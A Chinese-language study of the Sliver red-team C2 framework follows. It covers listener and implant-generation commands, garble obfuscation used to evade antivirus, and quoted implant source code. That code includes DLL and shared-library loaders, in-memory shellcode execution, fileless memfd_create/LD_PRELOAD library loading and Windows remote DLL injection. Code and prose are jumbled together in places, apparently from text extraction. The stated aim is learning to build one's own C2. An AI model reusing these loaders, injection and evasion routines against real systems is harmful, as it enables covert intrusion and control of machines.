Sliver 是一个基于Go的开源、跨平台的红队平台，可供各种规模的组织用于执行安全测试。 Sliver 
的木马 支持 C2 over Mutual-TLS、HTTP(S) 和 DNS等协议。 implant可以时时编译生成，并会使
用证书进行加密。
基于Go语言的特性，服务器和客户端以及implant都支持 MacOS、Windows 和 Linux。
Github地址:https://github.com/BishopFox/sliver  tag:v1.4.22
go语言越来越流行，并且作为红队使用语言有很多优势。它十分简单，代码可以轻松编译为native代码
到各类平台，跨平台开发非常容易。像py2exe和jar2exe，因为没有流行的软件，它们生成的工具很容
易被杀毒针对，而golang编写的软件像docker等，让杀软无法直接查杀golang语言本身的特征，这更方
便红队开发进行隐藏自己。
重要的是，已经有很多开源的，成熟的用于红队的代码，sliver就是其中之一。所以学习下sliver的代
码，主要积累一些相关的go代码，学习基于go的C2是怎么做的，方便之后自己写C2。
本文将主要总结Sliver c2的功能原理、代码结构、以及对抗方面的内容。
使用&简介
sliver运行需要配置一些环境变量，如go、gcc，方便生成木马时候进行编译，在kali下运行十分简单，
因为kali已经内置了这些变量，只需要在下载页面https://github.com/BishopFox/sliver/releases 下载
最新的 sliver-server_linux ，解压后直接运行即可。
输入 http -l 8888 用于开启一个基于http 8888端口的C2
输入 generate --http http://192.168.126.132:8888  生成一个基于http的c2木马。
它生成的时候默认会使用 garble 对implant源码进行一遍混淆，能够防止被分析。
sliver之前的版本使用的gobfuscate，在源码层面修改变量以及代码结构，速度比较慢，相比之下
garble是对中间编译环节进行混淆结构，速度比较快也能混淆大部分符号等信息。
生成完毕后的exe被点击后
使用 use [id] 选择要控制的机器即可对它进行操控了。
代码简介
sliver的代码结构中有三大组件
implant
植入物，有点拗口，可以理解为“木马”
server
teamserver，也可以进行交互操作
client
多用户时可以使用的交互客户端
这三个组件即构成了Sliver的C2服务，server也实现了client的功能，client就是使用rpc调用server的功
能，所以大部分情况下看server和implant就行了。
官方Readme上的一些Features和它的实现方式。
Dynamic code generation
动态代码生成，就是动态生成go源码然后编译
Compile-time obfuscation
使用go-obf混淆生成的go代码
Multiplayer-mode
支持多用户模式
Staged and Stageless payloads
Staged 主要是调用msf来生成的payload
Procedurally generated C2 over HTTP(S)
http混淆协议
Base64 Base64 with a custom alphabet so that it's not interoperable with standard 
Base64
Hex Standard hexadecimal encoding with ASCII characters
Gzip Standard gzip
English Encodes arbitrary data as English ASCII text
PNG Encodes arbitrary data into valid PNG image files
Gzip+English A combination of the Gzip and English encoders
Base64+Gzip A combination of the Base64 and Gzip encoders
[DNS canary] blue team detection
使用DNS诱饵域名 发现蓝队
Secure C2 over mTLS, WireGuard, HTTP(S), and DNS
C2通信支持的协议  mTLS, WireGuard, HTTP(S), DNS
Fully scriptable using JavaScript/TypeScript or Python
支持使用JavaScript和Python编写脚本
Local and remote process injection
本地和远程进程注入
Windows process migration
Windows user token manipulation
Anti-anti-anti-forensics
对抗
Let's Encrypt integration
Let's Encrypt集成
In-memory .NET assembly execution
Implant
implant是sliver c2的“木马”部分，也是整个c2的核心部分。sliver 的implant是支持跨平台的，三个平台
功能的基本功能基本上都有，但每个平台的支持程度还是稍有差异。但是它对windows平台的功能显然
更多一点。
sliver的提供了三种选项编译implant，编译成shellcode、编译成第三方库，和编译成exe。对于
windows，还支持生成 windows service 、 windows regsvr32/ PowerSploit 类型的文件，后两种
格式，其实就是一种含有特殊导出表的DLL。
编译成第三方库
能分别生成 .dll 、 .dylib 、 .so 文件，主要依赖cgo，要调用c语言编译器。所以想在server上多端生
成，要下载各个平台的交叉编译器。
主要就是 sliver.c 实现的。
#include "sliver.h"
#ifdef __WIN32
DWORD WINAPI Enjoy()
{
    RunSliver();
    return 0;
}
BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL, // handle to DLL module
    DWORD _fdwReason,    // reason for calling function
    LPVOID _lpReserved)  // reserved
{
    switch (_fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Initialize once for each new process.
        // Return FALSE to fail DLL load.
    {
        // {{if .Config.IsSharedLib}}
        HANDLE hThread = CreateThread(NULL, 0, Enjoy, NULL, 0, NULL);
        // CreateThread() because otherwise DllMain() is highly likely to 
deadlock.
        // {{end}}
    }
    break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_THREAD_ATTACH:
        // Do thread-specific initialization.
        break;
    }
    return TRUE; // Successful.
}
#elif __linux__
#include 
void RunSliver();
static void init(int argc, char **argv, char **envp)
{
    unsetenv("LD_PRELOAD");
    unsetenv("LD_PARAMS");
    RunSliver();
}
__attribute__((section(".init_array"), used)) static typeof(init) *init_p = 
init;
#elif __APPLE__
#include 
void RunSliver();
__attribute__((constructor)) static void init(int argc, char **argv, char 
**envp)
{
    unsetenv("DYLD_INSERT_LIBRARIES");
    unsetenv("LD_PARAMS");
    RunSliver();
}
windows在dllmain里面启动一个线程执行go函数，mac和linux直接再 init 上执行go函数。
编译成shellcode
只能在windows下使用，在 server\generate\binaries.go
编译shellcode，首先编译成dll，然后会使用go-donut github.com/binject/go-donut/donut  进行转
换为shellcode。
donut 可以将任意的exe、dll、.net等等程序转换为shellcode，go-donut 是donut 的go实现，关于
donut ，模仿cs开局一个shellcode的实现.md  有讲述相关原理。
功能
在大体看了implant代码后，我画了一张思维导图用来描述sliver c2 implant所具有的功能和技术。
#endif
功能详情
sideload
主要用于加载并执行库文件
Darwin
在本进程执行shellcode
sideload 这个会写出文件，将库文件写到tmp目录，指定环境变量 DYLD_INSERT_LIBRARIES 为文件路
径
func LocalTask(data []byte, rwxPages bool) error {
    dataAddr := uintptr(unsafe.Pointer(&data[0]))
    page := getPage(dataAddr)
    syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
    dataPtr := unsafe.Pointer(&data)
    funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
    runtime.LockOSThread()
    defer runtime.UnlockOSThread()
    go func(fPtr func()) {
        fPtr()
    }(funcPtr)
    return nil
}
// Sideload - Side load a library and return its output
func Sideload(procName string, data []byte, args string, kill bool) (string, 
error) {
    var (
        stdOut bytes.Buffer
        stdErr bytes.Buffer
        wg     sync.WaitGroup
    )
    fdPath := fmt.Sprintf("/tmp/.%s", randomString(10))
    err := ioutil.WriteFile(fdPath, data, 0755)
    if err != nil {
        return "", err
    }
    env := os.Environ()
    newEnv := []string{
        fmt.Sprintf("LD_PARAMS=%s", args),
        fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s", fdPath),
    }
    env = append(env, newEnv...)
    cmd := exec.Command(procName)
    cmd.Env = env
    cmd.Stdout = &stdOut
    cmd.Stderr = &stdErr
    //{{if .Config.Debug}}
    log.Printf("Starting %s\n", cmd.String())
linux
无文件落地、内存执行.so，原理是使用 memfd_create ，允许我们在内存中创建一个文件，但是它在内
存中的存储并不会被映射到文件系统中,执行程序时候设置环境变量 LD_PRELOAD ，预加载so文件
    //{{end}}
    wg.Add(1)
    go startAndWait(cmd, &wg)
    // Wait for process to terminate
    wg.Wait()
    // Cleanup
    os.Remove(fdPath)
    if len(stdErr.Bytes()) > 0 {
        return "", fmt.Errorf(stdErr.String())
    }
    //{{if .Config.Debug}}
    log.Printf("Done, stdout: %s\n", stdOut.String())
    log.Printf("Done, stderr: %s\n", stdErr.String())
    //{{end}}
    return stdOut.String(), nil
}
// Sideload - Side load a library and return its output
func Sideload(procName string, data []byte, args string, kill bool) (string, 
error) {
    var (
        nrMemfdCreate int
        stdOut        bytes.Buffer
        stdErr        bytes.Buffer
        wg            sync.WaitGroup
    )
    memfdName := randomString(8)
    memfd, err := syscall.BytePtrFromString(memfdName)
    if err != nil {
        //{{if .Config.Debug}}
        log.Printf("Error during conversion: %s\n", err)
        //{{end}}
        return "", err
    }
    if runtime.GOARCH == "386" {
        nrMemfdCreate = 356
    } else {
        nrMemfdCreate = 319
    }
    fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), 
uintptr(unsafe.Pointer(memfd)), 1, 0)
    pid := os.Getpid()
    fdPath := fmt.Sprintf("/proc/%d/fd/%d", pid, fd)
    err = ioutil.WriteFile(fdPath, data, 0755)
    if err != nil {
        //{{if .Config.Debug}}
        log.Printf("Error writing file to memfd: %s\n", err)
        //{{end}}
        return "", err
    }
    //{{if .Config.Debug}}
Windows
1. 使用 DuplicateHandle ,将句柄从一个进程复制到另一个进程
2. 在目标进程创建内存并使用创建远程线程执行dll
    log.Printf("Data written in %s\n", fdPath)
    //{{end}}
    env := os.Environ()
    newEnv := []string{
        fmt.Sprintf("LD_PARAMS=%s", args),
        fmt.Sprintf("LD_PRELOAD=%s", fdPath),
    }
    env = append(env, newEnv...)
    cmd := exec.Command(procName)
    cmd.Env = env
    cmd.Stdout = &stdOut
    cmd.Stderr = &stdErr
    //{{if .Config.Debug}}
    log.Printf("Starging %s\n", cmd.String())
    //{{end}}
    wg.Add(1)
    go startAndWait(cmd, &wg)
    // Wait for process to terminate
    wg.Wait()
    if len(stdErr.Bytes()) > 0 {
        return "", fmt.Errorf(stdErr.String())
    }
    //{{if .Config.Debug}}
    log.Printf("Done, stdout: %s\n", stdOut.String())
    log.Printf("Done, stderr: %s\n", stdErr.String())
    //{{end}}
    return stdOut.String(), nil
}
func SpawnDll(procName string, data []byte, offset uint32, args string, kill 
bool) (string, error) {
    var lpTargetHandle windows.Handle
    err := refresh()
    if err != nil {
        return "", err
    }
    var stdoutBuff bytes.Buffer
    var stderrBuff bytes.Buffer
    // 1 - Start process
    cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
    if err != nil {
        return "", err
    }
    pid := cmd.Process.Pid
    // {{if .Config.Debug}}
    log.Printf("[*] %s started, pid = %d\n", procName, pid)
    // {{end}}
    handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, 
uint32(pid))
    if err != nil {
        return "", err
    }
    currentProcHandle, err := windows.GetCurrentProcess()
    if err != nil {
        // {{if .Config.Debug}}
        log.Println("GetCurrentProcess failed")
        // {{end}}
        return "", err
    }
    err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, 
&lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
    if err != nil {
        // {{if .Config.Debug}}
        log.Println("DuplicateHandle failed")
        // {{end}}
        return "", err
    }
    defer windows.CloseHandle(handle)
    defer windows.CloseHandle(lpTargetHandle)
    dataAddr, err := allocAndWrite(data, lpTargetHandle, uint32(len(data)))
    argAddr := uintptr(0)
    if len(args) > 0 {
        //{{if .Config.Debug}}
        log.Printf("Args: %s\n", args)
        //{{end}}
        argsArray := []byte(args)
        argAddr, err = allocAndWrite(argsArray, lpTargetHandle, 
uint32(len(argsArray)))
        if err != nil {
            return "", err
        }
    }
    //{{if .Config.Debug}}
    log.Printf("[*] Args addr: 0x%08x\n", argAddr)
    //{{end}}
    startAddr := uintptr(dataAddr) + uintptr(offset)
    threadHandle, err := protectAndExec(lpTargetHandle, dataAddr, startAddr, 
argAddr, uint32(len(data)))
    if err != nil {
        return "", err
    }
    // {{if .Config.Debug}}
    log.Printf("[*] RemoteThread started. Waiting for execution to finish.\n")
    // {{end}}
    if kill {
        err = waitForCompletion(threadHandle)
        if err != nil {